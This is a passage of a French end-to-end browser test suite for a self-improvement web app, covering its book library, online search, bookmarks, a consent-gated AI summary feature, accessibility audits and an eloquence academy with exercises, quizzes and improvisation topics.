  eq(IMGS.seen.length, 2); yes(IMGS.seen.every(x => x.referer === null), 'référent transmis : ' + JSON.stringify(IMGS.seen)); yes((await stateOf()).ui.covers === true, 'choix non enregistré')
  await pb.getByLabel('Afficher les couvertures des livres').uncheck(); eq(await pb.locator('img.cov').count(), 0); eq((await stateOf()).ui.covers, false)
})

await T('Recherche en ligne : erreurs claires (catalogues en panne, fonction absente, page HTML à la place, annulation), le catalogue interne reste utilisable', async () => {
  await lib('#/12/en-ligne'); const q = pb.getByLabel('Rechercher un livre'), go = () => pb.getByRole('button', { name: /^Chercher « .* » en ligne$/ })
  await q.fill('zzqxv'); EXT.mode = 'down'; await go().click(); await pb.waitForSelector('[role=alert]:has-text("Aucun catalogue n’a répondu")')
  const m1 = await pb.textContent('[role=alert]'); yes(m1.includes('Project Gutenberg : trop long à répondre') && m1.includes('Open Library : service indisponible'), m1)
  EXT.mode = 'absent'; await go().click(); await pb.waitForSelector('[role=alert]:has-text("Configuration requise")'); yes((await pb.textContent('[role=alert]')).includes('api/ext'), 'mode d’emploi absent')
  EXT.mode = 'html'; await go().click(); await pb.waitForSelector('[role=alert]:has-text("Configuration requise")')
  EXT.mode = 'slow'; EXT.hold = new Promise(r => { EXT.release = r }); await go().click()
  await pb.getByRole('button', { name: 'Annuler la recherche' }).click(); await pb.waitForSelector('text=Annuler la recherche', { state: 'detached' }); eq(await pb.locator('[role=alert]').count(), 0, 'erreur affichée après annulation')
  EXT.release(); await wait(300); eq(await pb.locator('article[aria-label^="Résultat :"]').count(), 0, 'résultats affichés après annulation')
  EXT.mode = 'ok'; await pb.getByRole('button', { name: /^Catalogue \(/ }).click(); await q.fill('zzqxv'); await wait(200)
  yes((await pb.textContent('main')).includes('Aucun livre du catalogue intégré ne correspond.'), 'catalogue interne inutilisable')
})

await T('Recherche d’un livre externe puis ajout à Mes livres : message après enregistrement, liste conservée après rechargement, doublon refusé', async () => {
  EXT.mode = 'ok'; await lib(); await patch(() => { const s = JSON.parse(localStorage.getItem('believe:v2')); s.books = []; localStorage.setItem('believe:v2', JSON.stringify(s)) }); await pb.reload(); await pb.waitForSelector('h1:has-text("12.")')
  await pb.getByLabel('Rechercher un livre').fill('orgueil'); await pb.getByRole('search').getByRole('button', { name: 'Chercher en ligne' }).click(); await pb.waitForSelector('article[aria-label^="Résultat :"]')
  await pb.locator('article[aria-label="Résultat : Pride and Prejudice"]').first().getByRole('button', { name: 'Ajouter à Mes livres : Pride and Prejudice' }).click()
  await pb.waitForSelector('text=« Pride and Prejudice » ajouté à Mes livres.')
  const s = await stateOf(); eq(s.books.length, 1); eq(s.books[0].src, 'gu'); eq(s.books[0].url, 'https://www.gutenberg.org/ebooks/1342'); eq(s.books[0].st, 'lire')
  await pb.reload(); await pb.getByRole('button', { name: /^Mes livres \(1\)/ }).waitFor()
  await pb.getByRole('button', { name: /^Mes livres \(1\)/ }).click(); await pb.waitForSelector('article[aria-label="Mon livre : Pride and Prejudice"]')
  await pb.getByLabel('Rechercher un livre').fill('orgueil'); await pb.getByRole('button', { name: /^En ligne/ }).click(); await pb.getByRole('button', { name: /^Chercher « orgueil » en ligne$/ }).click(); await pb.waitForSelector('article[aria-label^="Résultat :"]')
  eq(await pb.locator('article[aria-label="Résultat : Pride and Prejudice"]').first().getByRole('link', { name: 'Dans Mes livres' }).count(), 1, 'doublon proposé')
})

await T('Marque-page : les pages lues cochent « 20 pages de mon livre » (rubrique 6) et restent après rechargement ; page atteinte comptée ou non', async () => {
  await lib('#/12/mes-livres'); const card = pb.locator('article[aria-label="Mon livre : Pride and Prejudice"]'), grp = card.getByRole('group', { name: 'Marque-page : Pride and Prejudice' })
  await grp.getByLabel('Pages lues', { exact: true }).fill('12'); await grp.getByRole('button', { name: 'Ajouter les pages lues : Pride and Prejudice' }).click(); await grp.getByRole('status').waitFor()
  await pb.goto(URL0 + '#/6'); await pb.reload(); await pb.waitForSelector('h1:has-text("Habitudes")')
  const sec = pb.locator('section[aria-labelledby="bm-livre"]'), coche = () => pb.locator('button[aria-pressed=true][aria-label^="20 pages de mon livre"]').count()
  eq(await coche(), 0, 'cochée avant 20 pages'); yes((await sec.textContent()).includes('12 / 20 pages'), (await sec.textContent()).slice(0, 200))
  const g = sec.getByRole('group', { name: 'Marque-page : Pride and Prejudice' })
  await g.getByLabel('Pages lues', { exact: true }).fill('8'); await g.getByRole('button', { name: 'Ajouter les pages lues : Pride and Prejudice' }).click()
  await sec.getByText('20 / 20 pages').waitFor(); eq(await coche(), 1, 'habitude non cochée à 20 pages'); yes((await sec.textContent()).includes('objectif atteint'), 'objectif non signalé')
  yes((await g.textContent()).includes('Page actuelle'), 'marque-page absent')
  await g.getByLabel('Page atteinte (marque-page)', { exact: true }).fill('100'); await g.getByLabel('Compter l’écart dans mes pages d’aujourd’hui', { exact: true }).uncheck(); await g.getByRole('button', { name: 'Placer le marque-page : Pride and Prejudice' }).click(); await g.getByRole('status').waitFor()
  await pb.reload(); await sec.waitFor(); const s = await stateOf(); eq(s.books[0].page, 100); yes((await sec.textContent()).includes('20 / 20 pages'), 'le total du jour a bougé alors que l’écart n’était pas compté')
  eq(await coche(), 1, 'habitude décochée après rechargement')
  await pb.goto(URL0 + '#/12/mes-livres'); await pb.reload(); await pb.waitForSelector('article[aria-label="Mon livre : Pride and Prejudice"]'); yes((await pb.textContent('article[aria-label="Mon livre : Pride and Prejudice"]')).includes('Page 100'), 'Mes livres n’est pas synchronisé')
})

await T('Fiche de synthèse IA : texte exact montré, accord puis clic requis, une seule requête sans donnée personnelle, étiquetée IA, gardée seulement à la demande', async () => {
  AI.seen.length = 0; await lib('#/12/mes-livres')
  await patch(() => { const s = JSON.parse(localStorage.getItem('believe:v2')); s.profile = { g: 'F', name: 'Sentinelle', age: 41, h: 170, w: 61.7, t: 60, ws: 71, lv: 'I', sx: 'F' }; s.consents.ai = false; localStorage.setItem('believe:v2', JSON.stringify(s)) }); await pb.reload(); await pb.waitForSelector('article[aria-label="Mon livre : Pride and Prejudice"]')
  await pb.getByRole('button', { name: 'Créer une fiche de synthèse (IA) : Pride and Prejudice' }).click()
  const shown = await pb.getByLabel('Texte exact qui sera envoyé').textContent(); yes(shown.startsWith('Livre : « Pride and Prejudice »\nAuteur : Austen, Jane') || shown.startsWith('Livre : « Pride and Prejudice »\nAuteur : '), shown)
  eq(await pb.getByRole('button', { name: 'Envoyer à l’IA' }).count(), 0, 'envoi possible sans accord'); eq(AI.seen.length, 0)
  await pb.getByRole('button', { name: 'Donner mon accord pour l’IA' }).click(); await pb.getByRole('button', { name: 'Envoyer à l’IA' }).waitFor(); await wait(300); eq(AI.seen.length, 0, 'envoi dès l’accord')
  await pb.getByRole('button', { name: 'Envoyer à l’IA' }).click(); await pb.waitForSelector('text=Généré par IA'); eq(AI.seen.length, 1)
  const sent = JSON.parse(AI.seen[0].body); eq(AI.seen[0].method, 'POST'); eq(sent, { mode: 'book', messages: [{ role: 'user', content: shown }] })
  for (const secret of ['Sentinelle', '61.7', '"age"', 'profile', 'consents']) yes(!AI.seen[0].body.includes(secret), 'donnée personnelle envoyée : ' + secret)
  yes((await pb.textContent('main')).includes('Darcy corrige son orgueil.') && (await pb.textContent('main')).includes('Modèle : gemini-simule'), 'fiche ou modèle non affichés')
  eq((await stateOf()).books[0].f ?? null, null, 'fiche gardée sans demande'); await pb.reload(); await pb.waitForSelector('article[aria-label="Mon livre : Pride and Prejudice"]'); eq(await pb.getByText('Généré par IA').count(), 0, 'fiche non demandée conservée')
  await pb.getByRole('button', { name: 'Créer une fiche de synthèse (IA) : Pride and Prejudice' }).click(); await pb.getByRole('button', { name: 'Envoyer à l’IA' }).click(); await pb.waitForSelector('text=Généré par IA')
  await pb.getByRole('button', { name: 'Garder la fiche avec le livre' }).click(); await pb.waitForSelector('text=Fiche gardée avec le livre.')
  await pb.reload(); await pb.waitForSelector('text=Darcy corrige son orgueil.'); eq((await stateOf()).books[0].f.m, 'gemini-simule')
  await pb.getByRole('button', { name: 'Supprimer la fiche de Pride and Prejudice' }).click(); await pb.getByRole('button', { name: 'Confirmer la suppression de la fiche de Pride and Prejudice' }).click(); await pb.waitForSelector('text=Fiche supprimée.')
})

await T('Fiche de synthèse IA : serveur non déployé (page HTML à la place) → « Configuration requise » avec mode d’emploi, jamais « fiche créée »', async () => {
  await B.ctx.unroute(/\/api\/ai$/); await lib('#/12/mes-livres')
  await pb.getByRole('button', { name: 'Créer une fiche de synthèse (IA) : Pride and Prejudice' }).click(); await pb.getByRole('button', { name: 'Envoyer à l’IA' }).click()
  await pb.waitForSelector('[role=alert]:has-text("Configuration requise")'); yes((await pb.textContent('[role=alert]')).includes('GEMINI_API_KEY'), 'mode d’emploi absent')
  eq(await pb.getByText('Généré par IA').count(), 0, 'fiche affichée sans réponse'); eq((await stateOf()).books[0].f ?? null, null)
})

await T('Balayage tactile réel entre les onglets de la bibliothèque (et du catalogue), rangée d’onglets visible en alternative', async () => {
  EXT.mode = 'ok'; await lib('#/12/en-ligne'); const { y, w } = await swipeArea(pb, 'main h2')
  eq(await pressed(pb), ['En ligne']); await swipe(pb, w - 40, y, 40, y); await pb.getByRole('button', { name: /^Mes livres \(/ }).and(pb.locator('[aria-pressed=true]')).waitFor(); yes((await pressed(pb))[0].startsWith('Mes livres'), 'balayage vers la gauche')
  const y2 = (await swipeArea(pb, 'article h3')).y; await swipe(pb, 40, y2, w - 40, y2); await pb.getByRole('button', { name: /^En ligne/ }).and(pb.locator('[aria-pressed=true]')).waitFor()
  const y4 = (await swipeArea(pb, 'main h2')).y; await swipe(pb, w - 40, y4, 40, y4 > 330 ? y4 - 280 : y4 + 280); await wait(300); eq(await pressed(pb), ['En ligne'], 'un geste trop vertical a changé d’onglet')
  await pb.getByRole('button', { name: /^Catalogue \(/ }).click(); const y3 = (await swipeArea(pb, 'article[aria-label^="Livre :"] h3')).y
  await swipe(pb, w - 40, y3, 40, y3); await wait(300); eq(await pb.evaluate(() => [...document.querySelectorAll('[aria-label="Filtrer le catalogue par catégorie"] .chip[aria-pressed=true]')].map(b => b.textContent?.split(' (')[0])), ['Classique'], 'le geste doit d’abord changer de catégorie')
})

await T('Hors ligne (service worker réel) : l’application et la recherche interne fonctionnent, la recherche en ligne dit clairement que le serveur est injoignable', async () => {
  await pa.goto(URL0 + '#/12'); await pa.reload(); await pa.waitForSelector('h1:has-text("12. Bibliothèque")'); await pa.evaluate(() => navigator.serviceWorker.ready); await wait(1200)
  await pa.context().setOffline(true)
  try {
    await pa.reload(); await pa.waitForSelector('h1:has-text("12. Bibliothèque")')
    await pa.getByLabel('Rechercher un livre').fill('machiavel'); await pa.waitForSelector('article[aria-label="Livre : The Prince"]')
    await pa.getByRole('search').getByRole('button', { name: 'Chercher en ligne' }).click(); await pa.waitForSelector('[role=alert]:has-text("hors ligne")')
    yes((await pa.textContent('[role=alert]')).includes('Serveur injoignable ou hors ligne'), await pa.textContent('[role=alert]'))
    await pa.getByRole('button', { name: /^Catalogue \(/ }).click(); await pa.waitForSelector('article[aria-label="Livre : The Prince"]')
  } finally { await pa.context().setOffline(false) }
})

for (const theme of ['light', 'dark', 'oled']) {
  await T('Accessibilité (axe-core, WCAG 2.1 AA, contrastes) : rubrique 12 (catalogue, fiche, en ligne, Mes livres, fiche IA) et marque-pages de la rubrique 6, thème ' + theme, async () => {
    EXT.mode = 'ok'; await lib()
    await patch(`() => { const s = JSON.parse(localStorage.getItem('believe:v2')); s.settings.theme = ${JSON.stringify(theme)}; s.ui.covers = true; s.consents.ai = true; localStorage.setItem('believe:v2', JSON.stringify(s)) }`)
    await pb.reload(); await pb.waitForSelector('h1:has-text("12.")'); await wait(400); await axe(pb, 'catalogue/' + theme)
    await pb.getByLabel('Rechercher un livre').fill('atomic'); await pb.getByRole('button', { name: 'Ouvrir la fiche de Atomic Habits' }).click(); await pb.getByRole('dialog').waitFor(); await wait(300); await axe(pb, 'fiche/' + theme); await pb.keyboard.press('Escape')
    await pb.getByLabel('Rechercher un livre').fill('orgueil'); await pb.getByRole('button', { name: /^En ligne/ }).click(); await pb.getByRole('button', { name: /^Chercher « orgueil » en ligne$/ }).click(); await pb.waitForSelector('article[aria-label^="Résultat :"]')
    await pb.waitForFunction(() => [...document.querySelectorAll('img.cov')].every(i => i.complete)); await wait(300); await axe(pb, 'en-ligne/' + theme)
    await pb.getByRole('button', { name: /^Mes livres \(/ }).click(); await pb.waitForSelector('article[aria-label="Mon livre : Pride and Prejudice"]')
    await pb.getByRole('button', { name: 'Créer une fiche de synthèse (IA) : Pride and Prejudice' }).click(); await pb.getByLabel('Texte exact qui sera envoyé').waitFor(); await wait(300); await axe(pb, 'mes-livres+fiche-ia/' + theme)
    await pb.goto(URL0 + '#/6'); await pb.reload(); await pb.waitForSelector('#bm-livre'); await wait(300); await axe(pb, 'marque-pages/' + theme)
    if (theme === 'dark') { await pb.goto(URL0 + '#/12/mes-livres'); await pb.reload(); await pb.waitForSelector('article[aria-label="Mon livre : Pride and Prejudice"]'); await shot(pb, 'bibliotheque-sombre') }
    if (theme === 'light') { await pb.goto(URL0 + '#/12'); await pb.reload(); await pb.waitForSelector('article[aria-label^="Livre :"]'); await shot(pb, 'bibliotheque-clair') }
  })
}

// =====================================================================================================================
// Rubrique 13 : académie d'éloquence, quiz, improvisation.
// Contexte A (service worker réel, faux micro) : chronos et auto-écoute réels. Contexte B (réseau simulé) : réponses de l'IA SIMULÉES, requêtes réellement
// émises enregistrées. Contexte C : horloge du navigateur fixée jour par jour (vrais rechargements) pour prouver l'anti-répétition persistante.
// Les bonnes réponses attendues viennent de la vraie banque (src/quizbank.ts compilée à la volée), pas de l'affichage.
// =====================================================================================================================
const QZ = await (async () => { const out = join(tmpdir(), 'believe-e2e-quiz-' + process.pid + '.mjs'); await build({ entryPoints: [join(process.cwd(), 'src/quiz.ts')], bundle: true, format: 'esm', platform: 'node', outfile: out, logLevel: 'silent' }); return import(pathToFileURL(out).href) })()
const BANK = QZ.allQ({ quiz: { gen: [] } }), viewQ = QZ.view
const stOf = p => p.evaluate(() => JSON.parse(localStorage.getItem('believe:v2')))
/** Modifie le stockage depuis une page statique du même site, hors de toute page de l'application : une application ouverte réécrirait son état en mémoire par-dessus la modification (et la fausserait au hasard des chargements différés). */
const viaStatic = async (p, fn, arg) => { await p.goto(URL0 + 'manifest.webmanifest'); await p.evaluate(fn, arg) }
const patchOf = async (p, fn, arg) => { const back = p.url(); await viaStatic(p, fn, arg); if (!back.includes('manifest.webmanifest')) { await p.goto(back); await p.waitForSelector('h1') } }
const resetAca = p => viaStatic(p, () => { const raw = localStorage.getItem('believe:v2'); if (!raw) return; const s = JSON.parse(raw); s.exo = { seen: [], cur: null, done: {} }; s.quiz = { seen: [], hashes: [], hist: [], cur: null, gen: [] }; s.impro = { seen: [], hist: [], cur: null }; s.consents.mic = false; s.consents.ai = false; s.checks = {}; s.profile = null; s.settings.theme = 'light'; localStorage.setItem('believe:v2', JSON.stringify(s)) })
const aca = async (p, hash) => { await p.goto(URL0 + hash); await p.reload(); await p.waitForSelector('h1:has-text("13. Académie")'); await wait(300) }
const secs = t => { const [m, s] = t.trim().split(':').map(Number); return m * 60 + s }
const liveOf = p => p.evaluate(() => window.__streams.flatMap(s => s.getTracks()).filter(t => t.readyState === 'live').length)
const idbAudios = p => p.evaluate(() => new Promise(res => { const r = indexedDB.open('BelieveAudioDB'); r.onsuccess = () => { const db = r.result; if (!db.objectStoreNames.contains('audios')) { db.close(); return res(0) } const q = db.transaction('audios').objectStore('audios').count(); q.onsuccess = () => { db.close(); res(q.result) } }; r.onerror = () => res(-1) }))
const EXO_CARD = 'article[aria-label^="Exercice :"]'
const pad2 = n => String(n).padStart(2, '0')
/** Ferme la fenêtre « Verset du jour » (affichée une fois par jour à l’ouverture) comme le ferait l’utilisateur ; renvoie true si elle était ouverte. */
const closeVerse = async p => { const d = p.getByRole('dialog', { name: 'Verset du jour' }); if (!(await d.count())) return false; await d.getByRole('button', { name: 'Continuer' }).click(); await d.waitFor({ state: 'detached' }); return true }
/** Répond à la question affichée avec la vraie bonne réponse (ou une mauvaise) et renvoie la question de la banque. */
const answerBank = async (page, good = true) => {
  const t = (await page.locator('.qq').textContent()).trim(), q = BANK.find(x => x.q === t)
  if (!q) throw new Error('question absente de la banque : ' + t)
  const k = viewQ(q).ok; await page.locator('.opt').nth(good ? k : (k + 1) % 4).click(); return q
}

await T('Académie, exercices : 5 familles différentes mémorisées, mêmes exercices après rechargement, chrono réel (pause qui fige, ± 15 s), « fait » seulement sur clic', async () => {
  await pa.goto(URL0 + '#/4'); await resetAca(pa); await aca(pa, '#/13/exo'); await pa.waitForSelector(EXO_CARD)
  eq(await pa.locator(EXO_CARD).count(), 5)
  const tags = await pa.locator(EXO_CARD + ' .tag').allTextContents(); eq(new Set(tags).size, 5, 'familles ' + tags)
  const s1 = await stOf(pa); eq(s1.exo.cur.ids.length, 5); eq(s1.exo.seen, s1.exo.cur.ids); eq(s1.exo.done, {})
  const titles = () => pa.locator(EXO_CARD).evaluateAll(a => a.map(x => x.getAttribute('aria-label'))), t1 = await titles()
  await pa.reload(); await pa.waitForSelector(EXO_CARD); eq(await titles(), t1, 'lot différent après rechargement'); eq((await stOf(pa)).exo, s1.exo)
  await pa.locator(EXO_CARD).first().getByRole('button', { name: /^Ouvrir/ }).click()
  const d = pa.getByRole('dialog'); await d.waitFor()
  const tm = () => d.getByRole('timer', { name: 'Chrono de l’exercice' }).textContent().then(secs), t0 = await tm()
  await d.getByRole('button', { name: 'Démarrer le chrono' }).click(); await wait(2700); const a1 = await tm()
  yes(t0 - a1 >= 2 && t0 - a1 <= 4, 'chrono ' + t0 + ' → ' + a1)
  await d.getByRole('button', { name: 'Pause' }).click(); const p1 = await tm(); await wait(1300); eq(await tm(), p1, 'la pause ne fige pas')
  await d.getByRole('button', { name: 'Reprendre' }).click(); await wait(1300); yes(p1 - (await tm()) >= 1, 'reprise sans effet')
  await d.getByRole('button', { name: 'Pause' }).click(); await d.getByRole('button', { name: 'Remettre à zéro' }).click(); eq(await tm(), t0, 'remise à zéro')
  await d.getByRole('button', { name: 'Ajouter 15 secondes' }).click(); eq(await tm(), t0 + 15)
  eq((await stOf(pa)).exo.done, {}, 'coché sans clic')
  await d.getByRole('button', { name: 'Marquer comme fait' }).click(); await pa.waitForSelector('text=Exercice marqué comme fait')
  await pa.keyboard.press('Escape'); await d.waitFor({ state: 'detached' })
  await pa.reload(); await pa.waitForSelector(EXO_CARD)
  yes((await pa.locator(EXO_CARD).first().textContent()).includes('fait aujourd’hui'), 'marque « fait » perdue'); eq(Object.values((await stOf(pa)).exo.done)[0].length, 1)
  await shot(pa, 'academie-exercices')
})

await T('Académie, auto-écoute : vrai micro simulé demandé au clic, relâché à l’arrêt, lecture réelle ; rien gardé sans clic ; supprimé en quittant ; gardé au dictaphone sur demande', async () => {
  await aca(pa, '#/13/exo')
  const first = pa.locator(EXO_CARD).first(), title = (await first.getAttribute('aria-label')).replace('Exercice : ', '')
  const open = async () => { await pa.locator(EXO_CARD).first().getByRole('button', { name: /^Ouvrir/ }).click(); const d = pa.getByRole('dialog'); await d.waitFor(); return d }
  let d = await open()
  eq(await pa.evaluate(() => window.__streams.length), 0, 'micro ouvert avant tout clic')
  await d.getByRole('button', { name: 'J’accepte' }).click(); eq(await pa.evaluate(() => window.__streams.length), 0, 'micro ouvert par l’accord seul')
  await d.getByRole('button', { name: 'M’enregistrer' }).click(); await d.getByRole('timer', { name: 'Durée enregistrée' }).waitFor()
  eq(await liveOf(pa), 1, 'micro inactif pendant l’enregistrement'); await wait(2600)
  yes(secs(await d.getByRole('timer', { name: 'Durée enregistrée' }).textContent()) >= 2, 'durée enregistrée')
  await d.getByRole('button', { name: 'Arrêter et m’écouter' }).click(); await d.locator('audio[aria-label="Écouter mon enregistrement"]').waitFor()
  eq(await liveOf(pa), 0, 'micro encore actif après l’arrêt')
  const played = await pa.evaluate(() => new Promise(res => { const a = document.querySelector('audio'); const t0 = Date.now(); const i = setInterval(() => { if (a.currentTime > 0.3) { clearInterval(i); res(a.currentTime) } else if (Date.now() - t0 > 6000) { clearInterval(i); res(a.error ? -1 : a.currentTime) } }, 100); a.play().catch(() => res(-2)) }))
  yes(played > 0.3, 'lecture réelle impossible : ' + played)
  eq(await idbAudios(pa), 0, 'sauvegardé sans clic'); await shot(pa, 'academie-auto-ecoute')
  await pa.keyboard.press('Escape'); await d.waitFor({ state: 'detached' })
  d = await open(); eq(await d.locator('audio').count(), 0, 'enregistrement revenu à la réouverture'); eq(await idbAudios(pa), 0)
  await d.getByRole('button', { name: 'M’enregistrer' }).click(); await d.getByRole('timer', { name: 'Durée enregistrée' }).waitFor(); eq(await liveOf(pa), 1)
  await pa.keyboard.press('Escape'); await d.waitFor({ state: 'detached' }); eq(await liveOf(pa), 0, 'micro actif après la fermeture de l’exercice')
  d = await open(); await d.getByRole('button', { name: 'M’enregistrer' }).click(); await d.getByRole('timer', { name: 'Durée enregistrée' }).waitFor(); await wait(1600)
  await d.getByRole('button', { name: 'Arrêter et m’écouter' }).click(); await d.getByRole('button', { name: 'Garder dans le dictaphone' }).click()
  await pa.waitForSelector('text=Audio gardé dans le dictaphone'); eq(await idbAudios(pa), 1)
  await pa.keyboard.press('Escape'); await d.waitFor({ state: 'detached' })
  await pa.goto(URL0 + '#/11/audio'); const art = pa.getByRole('article', { name: 'Audio Éloquence : ' + title }); await art.waitFor()
  yes((await art.textContent()).includes('Apprentissages'), 'catégorie du dictaphone')
  await art.getByRole('button', { name: 'Supprimer Éloquence : ' + title }).click(); await art.getByRole('button', { name: 'Confirmer la suppression de Éloquence : ' + title }).click(); await pa.waitForSelector('text=Audio supprimé de cet appareil (vérifié).'); eq(await idbAudios(pa), 0)
})

await T('Académie, quiz : explication et couleur de la vraie bonne réponse (clavier), score = bonnes réponses, reprise après rechargement, abandon sans historique', async () => {
  await resetAca(pa); await aca(pa, '#/13/quiz')
  await pa.getByRole('button', { name: 'Commencer le quiz du jour' }).click(); await pa.waitForSelector('.qq')
  eq((await stOf(pa)).quiz.cur.ids.length, 5); eq((await stOf(pa)).quiz.seen.length, 5)
  let right = 0
  for (let n = 0; n < 5; n++) {
    eq(await pa.locator('.opt').count(), 4); eq(await pa.locator('.fb').textContent(), '', 'correction visible avant la réponse')
    const t = (await pa.locator('.qq').textContent()).trim(), q = BANK.find(x => x.q === t), good = n % 2 === 0, k = viewQ(q).ok, pick = good ? k : (k + 1) % 4
    await pa.locator('.opt').nth(pick).focus(); await pa.keyboard.press('Enter')
    const fb = await pa.locator('.fb').textContent()
    yes(fb.includes(q.e), 'explication absente : ' + fb); if (good) { right++; yes(/^Bonne réponse\./.test(fb), fb) } else yes(/^Ce n’est pas la bonne réponse\./.test(fb), fb)
    eq(await pa.locator('.opt.good').count(), 1); eq((await pa.locator('.opt.good').textContent()).includes(q.o[q.a]), true, 'la réponse marquée juste n’est pas celle de la banque')
    eq(await pa.locator('.opt.bad').count(), good ? 0 : 1)
    yes(await pa.evaluate(() => /Question suivante|Voir mon score/.test(document.activeElement?.textContent ?? '')), 'focus non déplacé vers la suite')
    if (n === 1) { await pa.reload(); await pa.waitForSelector('h2:has-text("Question 3 sur 5")'); eq((await stOf(pa)).quiz.cur.ans && Object.keys((await stOf(pa)).quiz.cur.ans).length, 2); continue }
    await pa.keyboard.press('Enter')
  }
  await pa.waitForSelector('.score'); eq((await pa.locator('.score b').textContent()).trim(), right + ' / 5')
  const s = await stOf(pa); eq(s.quiz.hist.length, 1); eq(s.quiz.hist[0].ok, right); yes(s.checks[new Date().toLocaleDateString('sv-SE', { timeZone: 'Europe/Paris' })]?.length >= 1, 'habitude « Apprendre » non cochée')
  await shot(pa, 'academie-score')
  // un second quiz : questions toutes différentes ; abandon = pas d’historique, questions non reproposées
  await pa.getByRole('button', { name: 'Un autre quiz inédit' }).click(); await pa.waitForSelector('.qq')
  const ids2 = (await stOf(pa)).quiz.cur.ids; for (const id of ids2) yes(!s.quiz.cur.ids.includes(id), 'question répétée ' + id)
  await answerBank(pa, true); await pa.getByRole('button', { name: 'Abandonner ce quiz' }).click(); await pa.getByRole('button', { name: 'Confirmer l’abandon' }).click(); await pa.waitForSelector('text=Quiz abandonné.')
  const s2 = await stOf(pa); eq(s2.quiz.cur, null); eq(s2.quiz.hist.length, 1); eq(s2.quiz.seen.length, 10)
})

await T('Académie, improvisation : sujets jamais répétés (même après rechargements), difficulté sous chaque sujet, minuteur réel, enregistrement seulement sur clic, historique conservé', async () => {
  await resetAca(pa); await aca(pa, '#/13/impro')
  await pa.getByRole('button', { name: 'Obtenir un sujet' }).click(); const reg = pa.getByRole('region', { name: 'Sujet d’improvisation' }); await reg.waitFor()
  yes(/Difficulté : [1-5] \/ 5/.test(await reg.textContent()), 'difficulté absente')
  for (let r = 0; r < 4; r++) { for (let i = 0; i < 12; i++) await pa.getByRole('button', { name: 'Nouveau sujet' }).click(); await pa.reload(); await reg.waitFor() }
  const seen = (await stOf(pa)).impro.seen; eq(seen.length, 49); eq(new Set(seen).size, 49, 'sujet repris')
  eq((await stOf(pa)).impro.cur, seen[48], 'sujet courant non conservé'); eq((await stOf(pa)).impro.hist, [])
  await pa.getByRole('button', { name: '1 min' }).click(); const tm = () => pa.getByRole('timer', { name: 'Chrono de l’improvisation' }).textContent().then(secs)
  eq(await tm(), 60); await pa.getByRole('button', { name: 'Démarrer le chrono' }).click(); await wait(2700); const left = await tm(); yes(left >= 56 && left <= 58, 'chrono ' + left)
  eq((await stOf(pa)).impro.hist.length, 0, 'enregistré sans clic')
  await pa.getByRole('button', { name: 'J’ai terminé cette improvisation' }).click(); await pa.waitForSelector('text=Improvisation enregistrée dans l’historique')
  await pa.reload(); await reg.waitFor(); const h = (await stOf(pa)).impro.hist; eq(h.length, 1); yes(h[0].sec >= 2 && h[0].sec <= 4, 'durée ' + h[0].sec); eq(h[0].id, seen[48]); yes(h[0].diff >= 1 && h[0].diff <= 5)
  yes((await pa.textContent('main')).includes('1 improvisation enregistrée'), 'historique non affiché après rechargement'); await shot(pa, 'academie-improvisation')
})

const C = await mk({ serviceWorkers: 'block' }), pc = C.page
await T('Académie, exercices sur 25 jours consécutifs (horloge du navigateur, vrais rechargements) : 5 familles par jour, aucun exercice repris avant 11 jours, deux jours sans ouverture sans consommation', async () => {
  await pc.goto(URL0 + '#/4'); await pc.waitForSelector('h1'); await pc.evaluate(ONBOARDED)
  const lots = []
  for (let i = 0; i < 25; i++) {
    if (i === 7 || i === 8) continue
    await pc.clock.setFixedTime(new Date(Date.UTC(2026, 10, 1 + i, 9, 0, 0))); await pc.goto(URL0 + '#/13/exo'); await pc.reload(); await pc.waitForSelector(EXO_CARD)
    const s = await stOf(pc); lots.push({ i, d: s.exo.cur.d, ids: s.exo.cur.ids, fam: new Set(await pc.locator(EXO_CARD + ' .tag').allTextContents()).size, seen: s.exo.seen.length })
  }
  eq(lots.length, 23)
  for (const l of lots) { eq(l.d, '2026-11-' + pad2(1 + l.i), 'date du lot'); eq(l.ids.length, 5); eq(l.fam, 5, 'familles le jour ' + l.i) }
  eq(lots[22].seen, 115, 'jours sans ouverture consommés ?')
  const last = new Map()
  lots.forEach((l, k) => { for (const id of l.ids) { if (last.has(id)) yes(k - last.get(id) >= 11, 'exercice ' + id + ' repris après ' + (k - last.get(id)) + ' lots'); last.set(id, k) } })
  yes(new Set(lots.flatMap(l => l.ids)).size >= 60, 'peu d’exercices différents : ' + new Set(lots.flatMap(l => l.ids)).size)
})

await T('Académie, quiz sur 29 jours (vrais rechargements) : aucune question vue deux fois, mémoire conservée, quiz du jour sur 5 thèmes tant que possible, épuisement annoncé puis révision', async () => {
  await patchOf(pc, () => { const s = JSON.parse(localStorage.getItem('believe:v2')); s.quiz = { seen: [], hashes: [], hist: [], cur: null, gen: [] }; s.checks = {}; localStorage.setItem('believe:v2', JSON.stringify(s)) })
  const served = [], cats = []
  for (let i = 0; i < 31; i++) {
    await pc.clock.setFixedTime(new Date(Date.UTC(2026, 11, 1 + i, 9, 0, 0))); await pc.goto(URL0 + '#/13/quiz'); await pc.reload(); await pc.waitForSelector('h1:has-text("13. Académie")'); await wait(150)
    await closeVerse(pc) // si la fenêtre du verset du jour s'ouvre (nouveau jour), on la ferme comme le ferait l'utilisateur
    const start = pc.getByRole('button', { name: /^(Commencer le quiz du jour|Faire un autre quiz inédit)$/ })
    if (!(await start.count())) break
    await start.click(); await pc.waitForSelector('.qq')
    const n = +(await pc.locator('progress').first().getAttribute('max')), run = []
    for (let q = 0; q < n; q++) {
      const t = (await pc.locator('.qq').textContent()).trim(); served.push(t); run.push(BANK.find(x => x.q === t).c)
      await pc.locator('.opt').first().click(); await pc.getByRole('button', { name: q < n - 1 ? 'Question suivante' : 'Voir mon score' }).click()
    }
    cats.push(run)
  }
  eq(served.length, BANK.length, 'questions servies'); eq(new Set(served).size, served.length, 'une question a été servie deux fois')
  eq(cats.slice(0, 20).every(r => new Set(r).size === 5), true, 'les 20 premiers quiz ne couvrent pas les 5 thèmes')
  eq(cats.length, 28, 'nombre de quiz'); eq(cats[27].length, 1, 'dernier quiz')
  const s = await stOf(pc); eq(s.quiz.seen.length, BANK.length); eq(new Set(s.quiz.seen).size, BANK.length); eq(s.quiz.hist.length, 28); eq(s.quiz.hist.reduce((a, h) => a + h.n, 0), BANK.length)
  await pc.waitForSelector('text=Vous avez vu toutes les questions disponibles.') // après rechargement, l'accueil du quiz annonce l'épuisement
  eq(await pc.getByRole('button', { name: /Commencer le quiz du jour|Faire un autre quiz inédit/ }).count(), 0, 'quiz inédit proposé alors que la banque est épuisée')
